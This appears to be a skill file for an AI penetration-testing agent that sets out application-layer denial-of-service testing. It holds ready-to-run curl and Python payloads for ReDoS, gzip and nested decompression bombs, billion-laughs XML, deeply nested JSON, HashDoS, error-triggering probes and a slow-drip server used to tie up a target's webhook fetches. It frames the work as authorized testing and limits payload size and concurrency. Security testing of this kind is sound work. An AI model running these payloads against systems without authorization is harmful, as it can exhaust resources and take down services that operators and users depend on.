---
name: app-layer-dos
description: Application-layer denial-of-service testing — ReDoS, decompression bombs (gzip request bodies), server processing delays, GraphQL amplification cross-reference, and stack trace exploitation for DoS intelligence. Use when probing for resource exhaustion, regex-heavy input validation, compressed request handling, or slow-processing endpoints.
---

# Application-Layer Denial of Service

Systematic testing for application-layer resource exhaustion that bypasses infrastructure-level protections. These attacks consume CPU, memory, or thread pools through legitimate-looking requests — no volumetric flood required.

## When to Use

- Target accepts user-controlled input fed to regex validation (search, email, URL fields)
- Target accepts `Content-Encoding: gzip` on request bodies
- Target has endpoints with observable processing delays (file parsing, report generation, PDF export, image processing)
- Stack traces or verbose errors leak framework/library versions useful for targeting known DoS vectors
- GraphQL surface exists (cross-reference with `graphql-pentest` skill for batching/alias/fragment DoS)

## Phase 1: ReDoS (Regular Expression Denial of Service)

### Concept

Backtracking regex engines (PCRE, Python `re`, Ruby, Java `java.util.regex`, JavaScript RegExp) exhibit exponential time on crafted input when patterns contain nested quantifiers or overlapping alternations. A single request with a ~30-character payload can pin a CPU core for minutes.

### Identify Regex Sinks

Look for input fields that perform pattern validation:

- Email fields (common regex: `^([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)$`)
- URL/URI validators
- Search with wildcard or regex support
- Username/password complexity checks
- File upload name validation
- Custom input formats (phone, postal code, ID numbers)
- API parameters documented as accepting "patterns" or "regex"

### Probe Technique

Craft input that forces catastrophic backtracking. The general pattern is a long string of characters that match an ambiguous quantifier, followed by a character that forces backtrack:

```bash
# Classic ReDoS payload for email-like regex
# Pattern under attack: ^([a-zA-Z0-9_.+-]+)+@
# Payload: many matching chars + non-matching terminator
PAYLOAD=$(python3 -c "print('a' * 35 + '!')")

# Time the request vs baseline
time curl -sk -X POST "https://TARGET/api/validate" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$PAYLOAD\"}"
```

### Common Evil Patterns by Sink

| Sink | Likely Regex Pattern | Evil Input |
|------|---------------------|------------|
| Email | `([a-z]+)+@` | `aaaaaaaaaaaaaaaaaaaaaaaaaaa!` |
| URL | `(https?://[^\s]+)+` | `http://` + `a` × 30 + `\x01` |
| Search | `(.*a){n}` | `a` × 25 + `b` |
| Filename | `([a-zA-Z0-9._-]+)+\.` | `a.a.a.a.a.a.a.a.a.a.a.a.a.a!` |

### Escalation

1. **Baseline first:** Send normal valid input, record response time (3 samples).
2. **Incremental growth:** Start at 20 chars, increase to 25, 30, 35. If response time grows exponentially (not linearly), ReDoS is confirmed.
3. **Thread exhaustion:** If the server uses a synchronous worker pool, concurrent ReDoS requests can exhaust all workers. Do NOT test this in production without explicit authorization — a single slow request is sufficient proof.

### Evidence

```bash
# Step 1: Baseline (3 samples)
for i in 1 2 3; do
  curl -sk -w "time: %{time_total}s\n" -o /dev/null \
    -X POST "https://TARGET/api/validate" \
    -H "Content-Type: application/json" \
    -d '{"email": "user@example.com"}'
done

# Step 2: ReDoS payload (increasing lengths)
for len in 20 25 30; do
  PAYLOAD=$(python3 -c "print('a' * $len + '!')")
  curl -sk -w "time: %{time_total}s\n" -o /dev/null \
    -X POST "https://TARGET/api/validate" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$PAYLOAD\"}"
done

# Exponential curve (e.g., 0.5s → 2s → 32s) confirms ReDoS
```

## Phase 2: Decompression Bombs (Gzip Request Bodies)

### Concept

Many web frameworks transparently decompress `Content-Encoding: gzip` request bodies. A small compressed payload (~1 KB) can expand to gigabytes, exhausting server memory or disk.

### Step 1: Check Gzip Support

```bash
# Compress a normal request body
echo '{"query": "test"}' | gzip > /tmp/normal.gz

curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -H "Content-Encoding: gzip" \
  --data-binary @/tmp/normal.gz
```

- `200` with valid response = gzip decompression active
- `400` "unable to decompress" or identical to uncompressed = no transparent decompression
- `415` Unsupported Media Type = explicitly rejected

### Step 2: Craft Graduated Payloads

Do NOT send a multi-GB bomb. Start small and measure server behavior:

```bash
# Level 1: 1 MB decompressed (~1 KB compressed)
python3 -c "
import gzip, json
data = json.dumps({'data': 'A' * (1024 * 1024)}).encode()
with gzip.open('/tmp/bomb_1mb.gz', 'wb') as f:
    f.write(data)
import os; print(f'Compressed: {os.path.getsize(\"/tmp/bomb_1mb.gz\")} bytes')
"

# Level 2: 10 MB decompressed
python3 -c "
import gzip, json
data = json.dumps({'data': 'A' * (10 * 1024 * 1024)}).encode()
with gzip.open('/tmp/bomb_10mb.gz', 'wb') as f:
    f.write(data)
import os; print(f'Compressed: {os.path.getsize(\"/tmp/bomb_10mb.gz\")} bytes')
"

# Send Level 1 first
curl -sk -w "\nHTTP %{http_code} | time: %{time_total}s | size_download: %{size_download}\n" \
  -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -H "Content-Encoding: gzip" \
  --data-binary @/tmp/bomb_1mb.gz
```

### What to Watch For

| Response | Meaning |
|----------|---------|
| `200` after long delay | Server decompressed and processed the full payload — vulnerable |
| `413` Payload Too Large | Size limit applied AFTER decompression — partial protection (test if limit is high enough to cause harm) |
| `400` or connection reset | Server crashed or OOM killed during decompression |
| `200` instant response | Server likely has a decompression size cap or streams without buffering |

### Nested Gzip (Recursive Bomb)

Some frameworks recursively decompress. A gzip-within-gzip amplifies further:

```bash
python3 -c "
import gzip, io
# Inner layer: 10 MB of zeros
inner = gzip.compress(b'\x00' * (10 * 1024 * 1024))
# Outer layer: compress the compressed output
with gzip.open('/tmp/nested_bomb.gz', 'wb') as f:
    f.write(inner)
import os; print(f'Final size: {os.path.getsize(\"/tmp/nested_bomb.gz\")} bytes')
"
```

### Evidence

Document the compression ratio and server behavior:
- Compressed size sent (bytes on wire)
- Decompressed size (expected)
- Server response time vs baseline
- HTTP status code and any error messages
- Memory/CPU impact if observable (e.g., subsequent requests slow down)

## Phase 3: Timeouts and Server Processing Delays

### Concept

Endpoints that perform expensive server-side operations (PDF generation, image processing, report compilation, data export, search queries, file parsing) can be abused by triggering maximum-cost operations that tie up worker threads.

### Identify Slow Endpoints

During reconnaissance, flag endpoints with observable latency:

```bash
# Time all discovered endpoints
for endpoint in /api/report /api/export /api/search /api/convert /api/analyze; do
  curl -sk -w "$endpoint: %{time_total}s\n" -o /dev/null \
    "https://TARGET$endpoint"
done
```

Look for:
- **Report/export generators** — PDF, CSV, Excel exports with large data ranges
- **Search endpoints** — especially with wildcard, regex, or full-text search support
- **File processors** — image resize, document conversion, archive extraction
- **Aggregation queries** — analytics dashboards, statistics endpoints
- **Webhook/callback endpoints** — that fetch attacker-controlled URLs (tie up thread waiting on slow response)

### Amplification Techniques

**Large range parameters:**
```bash
# If a report endpoint accepts date ranges, request maximum span
curl -sk -w "time: %{time_total}s\n" -o /dev/null \
  "https://TARGET/api/report?from=2000-01-01&to=2099-12-31"
```

**Expensive search queries:**
```bash
# Wildcard/regex search forcing full table scan
curl -sk -w "time: %{time_total}s\n" -o /dev/null \
  -X POST "https://TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": ".*", "limit": 999999}'
```

**Slow-response webhook (if target fetches attacker URL):**
```bash
# Start a slow-drip server that holds the connection
python3 -c "
import http.server, time, socketserver

class SlowHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', '1000000')
        self.end_headers()
        # Drip-feed 1 byte per second
        for i in range(100):
            self.wfile.write(b'A')
            self.wfile.flush()
            time.sleep(1)

with socketserver.TCPServer(('', 8888), SlowHandler) as httpd:
    httpd.handle_request()
" &

# Trigger target to fetch our slow URL
curl -sk "https://TARGET/api/webhook?url=http://YOUR_SERVER:8888/slow"
```

### Evidence

Compare processing time for minimal vs maximal input on the same endpoint:
- Baseline: minimal parameters → X ms
- Amplified: maximum parameters → Y ms
- Multiplier: Y/X = amplification factor
- Document whether concurrent amplified requests compound the delay

## Phase 4: Stack Trace Exploitation for DoS Intelligence

### Concept

Verbose error responses and stack traces are not just information disclosure — they are a roadmap to DoS vectors. Framework versions, library names, regex engines, parser implementations, and thread pool configurations revealed in stack traces inform targeted resource exhaustion.

### Trigger Error Responses

```bash
# Type confusion
curl -sk "https://TARGET/api/users/null"
curl -sk "https://TARGET/api/users/undefined"
curl -sk "https://TARGET/api/users/NaN"
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" -d '{"id": [1,2,3]}'

# Oversized input
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d "{\"field\": \"$(python3 -c "print('A' * 100000)")\"}"

# Malformed content type
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" -d '{"json": true}'

# Null bytes
curl -sk "https://TARGET/api/endpoint%00.json"
```

### What to Extract

| Stack Trace Element | DoS Intelligence |
|---------------------|-----------------|
| `java.util.regex.Pattern` | Java regex engine — test ReDoS with `(a+)+` patterns |
| `re.match` / `re.compile` (Python) | Python `re` uses backtracking — ReDoS viable |
| `Nokogiri::XML` / `lxml.etree` | XML parser — test XXE billion-laughs entity expansion |
| `PIL` / `Pillow` / `ImageMagick` | Image processor — test pixel-flood (small file, huge dimensions) |
| `json.loads` with deep nesting error | JSON parser — test deeply nested `{{{...}}}` for stack overflow |
| `Thread pool exhausted` / `Worker timeout` | Thread pool sizing visible — calculate concurrent requests needed |
| Framework version (e.g., `Spring 5.3.x`, `Express 4.x`) | Search CVE databases for known DoS in that version |
| `java.lang.OutOfMemoryError` | Memory limit visible — calibrate decompression bomb size |
| `RecursionError` (Python) | Recursion limit ~1000 — test recursive data structures |

### Workflow

1. Trigger errors to extract framework/library intelligence
2. Map extracted info to specific DoS techniques (ReDoS engine, parser type, thread pool model)
3. Craft targeted payloads informed by the specific implementation
4. This is strictly reconnaissance — the intelligence feeds Phases 1-3 and the `graphql-pentest` skill

## Phase 5: Cross-Protocol Amplification

### XML Entity Expansion (Billion Laughs)

If the target accepts XML input (SOAP, RSS, SVG upload, SAML, config import):

```bash
cat > /tmp/billion_laughs_lite.xml << 'XMLEOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
XMLEOF

# Start small — lol4 is ~10KB expanded, not the full billion laughs
curl -sk -w "time: %{time_total}s\n" \
  -X POST "https://TARGET/api/xml-endpoint" \
  -H "Content-Type: application/xml" \
  --data-binary @/tmp/billion_laughs_lite.xml
```

Scale entity depth only after confirming the parser expands entities at all. Full billion laughs (lol9) expands to ~3 GB — use lol4/lol5 for proof, not destruction.

### JSON Parser Abuse

Deeply nested JSON can cause stack overflow or excessive memory allocation:

```bash
# Generate deeply nested JSON object
python3 -c "
depth = 10000
payload = '{\"a\":' * depth + '1' + '}' * depth
print(payload)
" > /tmp/deep_json.json

curl -sk -w "time: %{time_total}s\n" \
  -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/deep_json.json
```

### Hash Collision DoS (HashDoS)

Older frameworks (PHP < 8.0, Python < 3.3 without randomized hashing, Java < 8u40) are vulnerable to crafted JSON keys that collide in the hash table, turning O(1) lookups into O(n²):

```bash
# Only test if stack traces reveal vulnerable runtime versions
# Generate keys with known collision properties for the target hash function
python3 -c "
import json
# For demonstration — actual collision keys depend on the hash function
keys = {f'key_{i:05d}': 'v' for i in range(50000)}
print(json.dumps(keys))
" > /tmp/hashmap_payload.json

curl -sk -w "time: %{time_total}s\n" \
  -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/hashmap_payload.json
```

## Rules

- **Baseline first, always.** Every DoS claim requires a timing comparison: normal input vs crafted input on the same endpoint. No baseline = no finding.
- **Graduated payloads.** Start small (1 MB, 20 regex chars, depth 100). Increase incrementally. The goal is to prove the vulnerability exists, not to crash the target.
- **Single request proof.** If a single crafted request causes measurable resource exhaustion, that is the finding. Do NOT send concurrent requests to amplify impact unless explicitly authorized for load testing.
- **Exponential vs linear.** ReDoS is confirmed by exponential growth curves — if doubling input length roughly doubles time, that is linear and not ReDoS. True ReDoS shows 2x input → 4x+ time.
- **Stack traces are intelligence, not findings.** Verbose errors are gadgets that inform DoS targeting. Report them as information disclosure only if they leak sensitive data (credentials, internal IPs, secrets). Framework version disclosure alone is informational, not a vulnerability.
- **Cross-reference GraphQL.** For GraphQL DoS (batching, alias amplification, circular fragments, deep nesting), use the `graphql-pentest` skill — it has the full methodology. This skill covers the app-layer DoS patterns that apply broadly, not GraphQL-specific vectors.
- **Decompression bombs need gzip acceptance proof.** Always confirm the target decompresses `Content-Encoding: gzip` with a benign payload before sending any bomb. If gzip is not decompressed, skip this vector entirely.

## Chain With

- **graphql-pentest** — GraphQL-specific DoS vectors (batching amplification, alias amplification, circular fragment crashes, deep nesting)
- **race-condition-single-packet** — combine slow processing with race conditions to amplify thread pool exhaustion
- **h2-waf-bypass** — if WAF blocks oversized or malformed payloads, escalate via HTTP/2 framing tricks
- **blind-ssrf-chains** — slow-response webhook abuse (Phase 3) overlaps with SSRF testing when target fetches attacker URLs

## Reference

- [CWE-1333: Inefficient Regular Expression Complexity (ReDoS)](https://cwe.mitre.org/data/definitions/1333.html)
- [CWE-409: Improper Handling of Highly Compressed Data (Decompression Bomb)](https://cwe.mitre.org/data/definitions/409.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [CWE-776: Improper Restriction of Recursive Entity References (Billion Laughs)](https://cwe.mitre.org/data/definitions/776.html)
- [OWASP: Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [James Davis et al. — "The Impact of Regular Expression Denial of Service in Practice"](https://doi.org/10.1145/3236024.3236027)
